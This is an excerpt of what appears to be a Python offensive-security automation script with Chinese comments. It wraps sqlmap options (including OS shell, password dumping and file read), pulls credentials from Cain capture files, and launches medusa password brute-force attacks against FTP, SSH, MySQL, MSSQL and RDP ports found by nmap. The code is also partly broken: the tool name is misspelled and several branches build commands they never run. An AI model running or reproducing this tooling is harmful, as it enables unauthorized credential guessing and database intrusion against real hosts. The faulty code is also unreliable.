...
def combileMyParaAndArgvPara(command):
    ...
    singleArgvList=["--drop-set-cookie","--random-agent","--ignore-proxy","--skip-urlencode","-b","--banner","--current-user","--current-db","--is-dba","--users","--passwords","--privileges","--roles","--dbs","--tables","--exclude-sysdbs","--columns","--schema","--count","--dump","--dump-all","--sql-shell","--common-tables","--common-columns","--os-shell","--os-pwn","--batch","--eta","--flush-session","--forms","--fresh-queries","--hex","--no-cast","--parse-errors","--alert","--beep","--check-waf","--cleanup","--disable-coloring","-hpp","--identify-waf","--purge-output","--smart","--wizard"]
    doubleArgvList=["-v","-u","--url","--threads","-l","-m","-r","-g","--data","--param-del","--cookie","--load-cookies","--level","--user-agent","--referer","--headers","--auth-type","--auth-cred","--auth-cert","--proxy","--delay","--timeout","--retries","--randomize","--scope","--safe-url","--safe-freq","--eval","-p","--skip","--dbms","--os","--invalid-bignum","--invalid-logical","--prefix","--suffix","--tamper","--risk","--string","--not-string","--regexp","--code","--text-only","--titles","--technique","--time-sec","--union-cols","--union-char","--second-order","-D","-T","-C","--start","--stop","--first","--last","--search","--sql-query","--udf-inject","--shared-lib","--file-read","--file-write","--file-dest","--os-cmd","--reg-read","--reg-add","--reg-del","--reg-key","--reg-value","--reg-data","--reg-type","-s","-t","--charset","--crawl","--csv-del","--dbms-cred","--dump-format","--output-dir","-z","--answers","--gpage","--mobile"]
...
/tmp && tar -xvzf libssh2.tar.gz -C /usr/src && cd /usr/src/libssh2-1.2.6/ && ./configure && make && make install")
    ...
    os.system("apt-get install build-essential libssl-dev libpq5 libpq-dev libssh2-1 libssh2-1-dev libgcrypt11-dev libgnutls-dev libsvn-dev freerdp libfreerdp-dev")
    #下面下载并编译
...
def figlet2file(logo_str, file_abs_path, print_or_not):
    ...
    all_font_name_list = get_folder_all_file_name(figlet_font_dir, ['tlf', 'flf'])
...
def getCainKey(lstFile):
    #参数为cain目录下的包含用户名口令的文件,eg.pop3.lst,imap.lst,smtp.lst,http.lst...
...
def single_portBruteCrack_scan(target):
    ...
    def portBruteCrack(ip,nmapResultString):
        ...
        if re.search("Discovered open port 21/tcp",nmapResultString,re.I):
            cmd="mddusa -h %s -U %s -P %s -t 5 -O /tmp/medusaResult -M ftp" % (ip,ModulePath+"/dicts/user.txt",ModulePath+"dicts/pass.txt")
            os.system(cmd)
        ...
        if re.search("Discovered open port 22/tcp",nmapResultString,re.I):
            cmd="mddusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M ssh" % (ip,ModulePath+"dicts/pass.txt")
            os.system(cmd)
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
        ...
        if re.search("Discovered open port 3306/tcp",nmapResultString,re.I):
            cmd="mddusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M mysql" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
        ...
        if re.search("Discovered open port 1433/tcp",nmapResultString,re.I):
            cmd="mddusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M mssql" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
        ...
        if re.search("Discovered open port 3389/tcp",nmapResultString,re.I):
            cmd="mddusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M rdp" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
